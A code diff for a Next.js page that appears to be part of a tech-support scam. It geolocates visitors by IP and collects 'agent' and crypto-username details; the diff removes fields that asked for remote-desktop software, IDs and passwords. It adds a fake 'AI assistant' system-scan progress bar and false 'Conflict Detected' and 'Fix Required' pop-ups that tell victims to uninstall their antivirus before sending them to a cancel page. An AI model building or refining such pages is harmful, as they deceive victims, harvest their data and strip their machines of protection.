@@ -2,6 +2,7 @@
 
 import Image from 'next/image'
 import { useState, useEffect } from 'react'
+import { useRouter } from 'next/navigation'
 
 interface SessionData {
   userAgent: string
@@ -19,6 +20,7 @@ interface DeviceProfile {
 }
 
 export default function Home() {
+  const router = useRouter()
   const [sessionData, setSessionData] = useState<SessionData>({
     userAgent: '',
     ipAddress: '',
@@ -40,15 +42,15 @@ export default function Home() {
     agentId: '',
     agentName: '',
     alternatePhone: '',
-    remoteSoftware: '',
-    remoteId: '',
-    remotePassword: '',
     explicitContent: '',
     cryptoUsername: '',
   })
 
   const [showModal, setShowModal] = useState(false)
   const [progress, setProgress] = useState(0)
+  const [showConflictModal, setShowConflictModal] = useState(false)
+  const [showFixModal, setShowFixModal] = useState(false)
+  const [selectedAntivirus, setSelectedAntivirus] = useState('')
 
   useEffect(() => {
     // Get session data
@@ -80,11 +82,11 @@ export default function Home() {
 
   const fetchIPData = async () => {
     try {
-      // Try first API
+      // Try primary API: ipwho.is (good CORS support)
       const controller = new AbortController()
       const timeoutId = setTimeout(() => controller.abort(), 5000)
       
-      const response = await fetch('https://ipapi.co/json/', {
+      const response = await fetch('https://ipwho.is/', {
         signal: controller.signal
       })
       
@@ -95,51 +97,81 @@ export default function Home() {
       }
       
       const data = await response.json()
-      
-      if (data.error) {
-        throw new Error(data.reason || 'API error')
+
+      if (data.success === false) {
+        throw new Error(data.message || 'API error')
       }
-      
+
       setSessionData(prev => ({
         ...prev,
         ipAddress: data.ip || 'Unknown',
         city: data.city || 'Unknown',
-        state: data.region || 'Unknown',
-        country: data.country_name || 'Unknown',
+        state: data.region || data.region_name || 'Unknown',
+        country: data.country || data.country_name || 'Unknown',
       }))
     } catch (error) {
-      // Fallback - try to get just IP address
+      // Fallback 1: ipapi.co
       try {
         const controller = new AbortController()
         const timeoutId = setTimeout(() => controller.abort(), 5000)
         
-        const response = await fetch('https://api.ipify.org?format=json', {
+        const response = await fetch('https://ipapi.co/json/', {
           signal: controller.signal
         })
         
         clearTimeout(timeoutId)
         
-        if (response.ok) {
-          const data = await response.json()
+        if (!response.ok) {
+          throw new Error('API failed')
+        }
+
+        const data = await response.json()
+
+        if (data.error) {
+          throw new Error(data.reason || 'API error')
+        }
+
+        setSessionData(prev => ({
+          ...prev,
+          ipAddress: data.ip || 'Unknown',
+          city: data.city || 'Unknown',
+          state: data.region || 'Unknown',
+          country: data.country_name || 'Unknown',
+        }))
+      } catch (fallbackError) {
+        // Final fallback 2: just IP from ipify
+        try {
+          const controller = new AbortController()
+          const timeoutId = setTimeout(() => controller.abort(), 5000)
+
+          const response = await fetch('https://api.ipify.org?format=json', {
+            signal: controller.signal
+          })
+
+          clearTimeout(timeoutId)
+
+          if (response.ok) {
+            const data = await response.json()
+            setSessionData(prev => ({
+              ...prev,
+              ipAddress: data.ip || 'Unable to detect',
+              city: 'Unable to detect',
+              state: 'Unable to detect',
+              country: 'Unable to detect',
+            }))
+          } else {
+            throw new Error('API failed')
+          }
+        } catch {
+          // Final fallback
           setSessionData(prev => ({
             ...prev,
-            ipAddress: data.ip || 'Unable to detect',
+            ipAddress: 'Unable to detect',
             city: 'Unable to detect',
             state: 'Unable to detect',
             country: 'Unable to detect',
           }))
-        } else {
-          throw new Error('API failed')
         }
-      } catch (fallbackError) {
-        // Final fallback
-        setSessionData(prev => ({
-          ...prev,
-          ipAddress: 'Unable to detect',
-          city: 'Unable to detect',
-          state: 'Unable to detect',
-          country: 'Unable to detect',
-        }))
       }
     }
   }
@@ -156,9 +188,6 @@ export default function Home() {
       formData.agentId.trim() !== '' &&
       formData.agentName.trim() !== '' &&
       formData.alternatePhone.trim() !== '' &&
-      formData.remoteSoftware.trim() !== '' &&
-      formData.remoteId.trim() !== '' &&
-      formData.remotePassword.trim() !== '' &&
       formData.explicitContent !== '' &&
       formData.cryptoUsername.trim() !== ''
     )
@@ -175,9 +204,6 @@ export default function Home() {
 *Agent ID:* ${data.agentId || 'N/A'}
 *Agent Name:* ${data.agentName || 'N/A'}
 *Alternate Phone:* ${data.alternatePhone || 'N/A'}
-*Remote Software:* ${data.remoteSoftware || 'N/A'}
-*Remote ID:* ${data.remoteId || 'N/A'}
-*Remote Password:* ${data.remotePassword || 'N/A'}
 *Explicit Content:* ${data.explicitContent || 'N/A'}
 *Crypto Username:* ${data.cryptoUsername || 'N/A'}
 
@@ -236,38 +262,42 @@ export default function Home() {
   }
 
   useEffect(() => {
-    if (showModal) {
-      // Prevent body scroll when modal is open
-      document.body.style.overflow = 'hidden'
-      
-      const duration = 35000 // 35 seconds
-      const interval = 50 // Update every 50ms for smoother animation
-      const increment = (100 / duration) * interval
-      
-      const timer = setInterval(() => {
-        setProgress((prev) => {
-          const newProgress = prev + increment
-          if (newProgress >= 100) {
-            clearInterval(timer)
-            setTimeout(() => {
-              setShowModal(false)
-              setProgress(0)
-              document.body.style.overflow = ''
-            }, 500)
-            return 100
-          }
-          return newProgress
-        })
-      }, interval)
+    const anyModalOpen = showModal || showConflictModal || showFixModal
 
-      return () => {
-        clearInterval(timer)
-        document.body.style.overflow = ''
-      }
+    if (anyModalOpen) {
+      document.body.style.overflow = 'hidden'
     } else {
       document.body.style.overflow = ''
     }
-  }, [showModal])
+
+    if (!showModal) {
+      return
+    }
+
+    const duration = 35000 // 35 seconds
+    const interval = 50 // Update every 50ms for smoother animation
+    const increment = (100 / duration) * interval
+
+    const timer = setInterval(() => {
+      setProgress((prev) => {
+        const newProgress = prev + increment
+        if (newProgress >= 100) {
+          clearInterval(timer)
+          setTimeout(() => {
+            setShowModal(false)
+            setProgress(0)
+            setShowConflictModal(true)
+          }, 500)
+          return 100
+        }
+        return newProgress
+      })
+    }, interval)
+
+    return () => {
+      clearInterval(timer)
+    }
+  }, [showModal, showConflictModal, showFixModal])
 
   return (
     <>
@@ -417,50 +447,6 @@ export default function Home() {
               </div>
 
               <div className="form-group">
-                <label className="form-label">Remote Software</label>
-                <select
-                  name="remoteSoftware"
-                  className="form-select"
-                  value={formData.remoteSoftware}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                >
-                  <option value="">Please select remote software...</option>
-                  <option value="AnyDesk">AnyDesk</option>
-                  <option value="TeamViewer">TeamViewer</option>
-                  <option value="UltraViewer">UltraViewer</option>
-                  <option value="Chrome Remote Desktop">Chrome Remote Desktop</option>
-                  <option value="AnyViewer">AnyViewer</option>
-                  <option value="RustDesk">RustDesk</option>
-                  <option value="Other">Other</option>
-                </select>
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Remote ID</label>
-                <input
-                  type="text"
-                  name="remoteId"
-                  className="form-input"
-                  value={formData.remoteId}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                />
-              </div>
-
-              <div className="form-group">
-                <label className="form-label">Remote Password</label>
-                <input
-                  type="text"
-                  name="remotePassword"
-                  className="form-input"
-                  value={formData.remotePassword}
-                  onChange={handleInputChange}
-                  autoComplete="off"
-                />
-              </div>
-
-              <div className="form-group">
                 <label className="form-label">Explicit Content</label>
                 <select
                   name="explicitContent"
@@ -555,6 +541,95 @@ export default function Home() {
                 <span className="status-icon"></span>
                 AI assistant: analysing system configuration in real time
               </p>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Conflict Detected Modal */}
+      {showConflictModal && (
+        <div className="modal-overlay">
+          <div className="conflict-modal">
+            <h3 className="conflict-title">Conflict Detected</h3>
+
+            <p className="conflict-text-main">
+              Windows Defender appears to be conflicting with an existing Anti-Virus.
+            </p>
+
+            <p className="conflict-text-sub">
+              Please select below which Anti-Virus you currently have installed.
+            </p>
+
+            <div className="conflict-select-wrapper">
+              <select
+                name="installedAntivirus"
+                className="conflict-select"
+                value={selectedAntivirus}
+                onChange={(e) => setSelectedAntivirus(e.target.value)}
+              >
+                <option value="">Select Anti-Virus...</option>
+                <option value="Norton">Norton</option>
+                <option value="McAfee">McAfee</option>
+                <option value="AVG">AVG</option>
+                <option value="Trend Micro">Trend Micro</option>
+                <option value="MalwareBytes">MalwareBytes</option>
+                <option value="Avast">Avast</option>
+                <option value="Bitdefender">Bitdefender</option>
+                <option value="Kaspersky">Kaspersky</option>
+                <option value="Webroot">Webroot</option>
+                <option value="Windows Defender">Windows Defender</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+
+            <div className="conflict-button-row">
+              <button
+                type="button"
+                className="conflict-proceed-button"
+                disabled={!selectedAntivirus}
+                onClick={() => {
+                  setShowConflictModal(false)
+                  setShowFixModal(true)
+                }}
+              >
+                Proceed &gt;
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Fix Required Modal */}
+      {showFixModal && (
+        <div className="modal-overlay">
+          <div className="fix-modal">
+            <h3 className="fix-title">Fix Required</h3>
+
+            <p className="fix-text-main">
+              {selectedAntivirus || 'This Anti-Virus'} is not supported with your version of{' '}
+              <span className="fix-highlight">Windows</span>.
+            </p>
+
+            <p className="fix-text-sub">
+              Please uninstall {selectedAntivirus || 'this Anti-Virus'} immediately.
+            </p>
+
+            <div className="conflict-button-row">
+              <button
+                type="button"
+                className="submit-button"
+                onClick={() => {
+                  setShowFixModal(false)
+                  const target = (selectedAntivirus || 'McAfee')
+                    .toLowerCase()
+                    .replace(/\s+/g, '')
+                    .replace(/[^a-z0-9]/g, '')
+                  setSelectedAntivirus('')
+                  router.push(`/cancel/${target}`)
+                }}
+              >
+                Fix Now &gt;
+              </button>
             </div>
           </div>
         </div>
